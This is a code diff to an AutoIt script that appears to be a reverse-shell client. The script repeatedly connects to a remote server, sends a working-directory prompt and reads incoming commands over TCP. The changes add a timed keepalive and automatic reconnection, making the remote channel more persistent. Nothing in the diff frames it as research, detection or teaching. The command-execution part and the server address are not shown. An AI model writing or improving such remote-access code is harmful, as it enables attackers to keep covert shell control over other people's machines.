@@ -37,7 +37,7 @@ Func ConnectToServer()
 				Return $socket
 			Else
 				TCPCloseSocket($socket)
-				TCPShutdown()
+;~ 				TCPShutdown()
 			EndIf
 		EndIf
 		Sleep(1000)
@@ -60,13 +60,17 @@ EndFunc
 
 $socket = ConnectToServer()
 TCPSend($socket, $currentDir & "> ")
+Local $lastCheck = TimerInit()
 
 While 1
-    If @error Or $socket = -1 Then ;wait to connect again
-        TCPCloseSocket($socket)
-        TCPShutdown()
-        $socket = ConnectToServer() 
-        TCPSend($socket, $currentDir & "> ") 
+    If TimerDiff($lastCheck) > 30000 Then
+        If TCPSend($socket, " ") = 0 Then ;check if disconnected
+            TCPCloseSocket($socket)
+            TCPShutdown()
+            $socket = ConnectToServer()
+            TCPSend($socket, $currentDir & "> ")
+        EndIf
+        $lastCheck = TimerInit()  
     EndIf
     Local $recv = TCPRecv($socket, 1024)
     If $recv <> "" Then
